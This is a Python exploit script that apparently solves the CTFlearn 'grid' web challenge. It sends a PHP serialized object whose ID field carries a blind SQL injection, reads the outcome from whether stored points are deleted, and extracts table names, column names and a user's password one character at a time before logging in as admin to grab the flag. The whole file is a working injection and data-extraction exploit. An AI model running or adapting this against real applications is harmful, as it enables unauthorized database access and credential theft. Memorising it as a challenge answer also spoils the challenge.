import requests
import re
import string

url = "https://web.ctflearn.com/grid"
s = requests.Session()

# login
s.post(f'{url}/controller.php?action=login', data={
    'uname': 'test',
    'pass': 'test'
})

# to check for deletion
def add():
    s.post(f"{url}/controller.php?action=add_point", data={ 'x': 1, 'y': 1 })

# sqli
def inject(payload):
    payload = f'0 or {payload}'

    obj = (
        'O:5:"point":3:{'
        's:1:"x";s:4:"aaaa";'
        's:1:"y";s:1:"2";'
        f's:2:"ID";s:{len(payload)}:"{payload}";'
        '}'
    )

    res = s.post(f'{url}/controller.php?action=delete_point', params={ 'point': obj })

    points = re.findall(r"<a href='controller\.php\?action=delete([^']*)'>", res.text)
    return len(points) == 0

# reset points
def clear():
    inject("0 or 1")

charset = string.ascii_lowercase + string.digits + "{}_"

def setup(func):
    def wrapper(*args):
        clear()
        add()
        return func(*args)
    return wrapper

# helper functions
@setup
def get_value(col, table, offset=0, cond=''):
    length = 0
    while True:
        print("Trying:", length)
        if inject(f"(select length({col}) from {table} {cond} limit 1 offset {offset})={length}"):
            break
        length += 1
    
    print("Length:", length)

    name = ""
    for _ in range(length):
        add()
        
        for char in charset:
            print("Trying:", char, '|', name)
            if inject(f"(select {col} from {table} {cond} limit 1 offset {offset}) like '{name}{char}%'"):
                name += char
                break
    return name

@setup
def get_entries(table, cond=''):
    entries = 0

    while True:
        print("Trying:", entries)
        if inject(f'(select count(*) from {table} {cond})={entries}'):
            return entries
        
        entries += 1

# leak database
def get_tables():
    tables = get_entries("information_schema.tables", "where table_schema=DATABASE()")

    print(f"Found {tables} tables")

    table_names = []

    for table in range(tables):
        name = get_value("table_name", "information_schema.tables", table, "where table_schema=DATABASE()")

        print("Table name:", name)
        table_names.append(name)

    print("Tables:", table_names)

def get_columns(table):
    cols = get_entries("information_schema.columns", f'where table_name="{table}"')
    print("Table:", table, "| Columns:", cols)

    col_names = []
    for col in range(cols):
        name = get_value("column_name", "information_schema.columns", col, f'where table_name="{table}"')
        print(f"Column {col + 1}:", name)

        col_names.append(name)

    print("Table:", table, '| Columns:', col_names)

def get_password(username):
    pwd = get_value('password', 'user', 0, f"where username='{username}'")
    print("Username:", username, '| Password:', pwd)

# get flag
def get_flag():
    res = s.post(f'{url}/controller.php?action=login', data={
        'uname': 'admin',
        'pass': 'grapevine'
    })

    flag = re.findall(r'(ctflearn{.+})', res.text)[0]
    print("Flag:", flag)


clear()
add()
print(inject('(select count(*) from user where username="admin")>0'))